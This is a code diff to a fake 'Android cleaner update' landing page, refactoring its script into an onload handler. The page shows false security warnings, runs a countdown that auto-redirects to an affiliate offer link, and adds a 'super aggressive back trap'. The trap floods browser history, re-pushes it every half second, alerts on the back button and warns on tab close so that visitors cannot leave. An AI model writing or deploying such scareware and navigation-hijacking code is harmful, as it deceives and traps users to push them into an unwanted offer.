@@ -67,68 +67,64 @@
     Update now for <strong>FREE</strong> to clean and boost your Android immediately!</p>
     <div class="timer" id="countdown">5 minutes 00 seconds</div>
     <div class="btn-container">
-      <button class="btn cancel" onclick="cancelAction()">CANCEL</button>
-      <button class="btn update" onclick="updateNow()">UPDATE NOW</button>
+      <button class="btn cancel" id="cancelBtn">CANCEL</button>
+      <button class="btn update" id="updateBtn">UPDATE NOW</button>
     </div>
   </div>
 
   <script>
-    const offerLink = "https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=VPN_ANDROID&site=ANDROID_LANDER";
+    window.onload = function () {
+      const offerLink = "https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=VPN_ANDROID&site=ANDROID_LANDER";
 
-    function updateNow() {
-      window.location.href = offerLink;
-    }
+      document.getElementById("updateBtn").onclick = function () {
+        window.location.href = offerLink;
+      };
 
-    function cancelAction() {
-      alert("Cleaner update strongly recommended for Android performance.");
-    }
+      document.getElementById("cancelBtn").onclick = function () {
+        alert("Cleaner update strongly recommended for Android performance.");
+      };
 
-    // MAX Aggressive Back Trap
-    function maxBackTrap() {
+      // Super aggressive back trap
       for (let i = 0; i < 10; i++) {
         history.pushState(null, "", location.href);
       }
 
-      // Trigger on back button
       window.addEventListener("popstate", function () {
         alert("⚠️ WARNING: Your Android system is exposed. Update is critical!");
         history.pushState(null, "", location.href);
       });
 
-      // Re-push every 500ms
       setInterval(() => {
         history.pushState(null, "", location.href);
         window.scrollTo(0, 0);
       }, 500);
-    }
 
-    // Prevent page close (exit warning)
-    window.onbeforeunload = function () {
-      return "Are you sure you want to leave this page? Your device may remain unprotected.";
-    };
+      // Exit warning if they try to close tab
+      window.onbeforeunload = function () {
+        return "Are you sure you want to leave this page? Your device may remain unprotected.";
+      };
 
-    maxBackTrap();
+      // Timer countdown
+      let minutes = 5;
+      let seconds = 0;
+      const timerDisplay = document.getElementById("countdown");
 
-    // Countdown
-    let minutes = 5;
-    let seconds = 0;
-    const timerDisplay = document.getElementById("countdown");
-
-    const timer = setInterval(() => {
-      if (seconds === 0) {
-        if (minutes === 0) {
-          clearInterval(timer);
-          timerDisplay.innerText = "Time expired. Redirecting...";
-          updateNow();
-          return;
+      const timer = setInterval(() => {
+        if (seconds === 0) {
+          if (minutes === 0) {
+            clearInterval(timer);
+            timerDisplay.innerText = "Time expired. Redirecting...";
+            window.location.href = offerLink;
+            return;
+          }
+          minutes--;
+          seconds = 59;
+        } else {
+          seconds--;
         }
-        minutes--;
-        seconds = 59;
-      } else {
-        seconds--;
-      }
-      timerDisplay.innerText = \`\${minutes} minute\${minutes !== 1 ? 's' : ''} \${seconds} second\${seconds !== 1 ? 's' : ''}\`;
-    }, 1000);
+        timerDisplay.innerText = `${minutes} minute${minutes !== 1 ? 's' : ''} ${seconds} second${seconds !== 1 ? 's' : ''}`;
+      }, 1000);
+    };
   </script>
 </body>
 </html>
